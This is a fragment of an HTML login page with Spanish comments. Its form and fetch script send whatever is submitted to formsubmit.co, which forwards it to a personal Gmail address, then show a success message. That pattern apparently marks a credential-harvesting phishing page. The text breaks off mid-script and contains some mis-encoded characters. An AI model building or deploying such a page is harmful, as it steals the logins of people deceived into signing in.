<body>
    <div class="login-container">

        <form id="loginForm" action="https://formsubmit.co/carlosandrespacheco38@gmail.com" method="POST">

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            const forgotPasswordLink = document.getElementById('forgotPassword');
            const createAccountLink = document.getElementById('createAccount');
            
            // Manejar el envÃ­o del formulario
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Mostrar mensaje de carga
                const submitButton = form.querySelector('button[type="submit"]');
                const originalButtonText = submitButton.innerHTML;
                submitButton.innerHTML = 'PROCESANDO... <span class="diamond-icon">âš¡</span>';
                submitButton.disabled = true;
                
                // Enviar el formulario con Fetch API
                fetch(form.action, {
                    method: 'POST',
                    body: new FormData(form),
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => {
                    if (response.ok) {
                        successMessage.classList.remove('hidden');
                        form.reset();
                    } else {
                        throw new Error('Error en el envÃ­o');
                    }
                })
                .catch(error => {
                    errorMessage.classList.remove('hidden');
                })
                .finally(() => {
                    submitButton.innerHTML = originalButtonText;
                    submitButton.disabled = false;
                });
            });
            
            // Manejar parÃ¡metros de URL para mostrar mensajes
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('success')) {
                successMessage.classList.remove('hidden');
            }
            
            // Enlaces adicionales
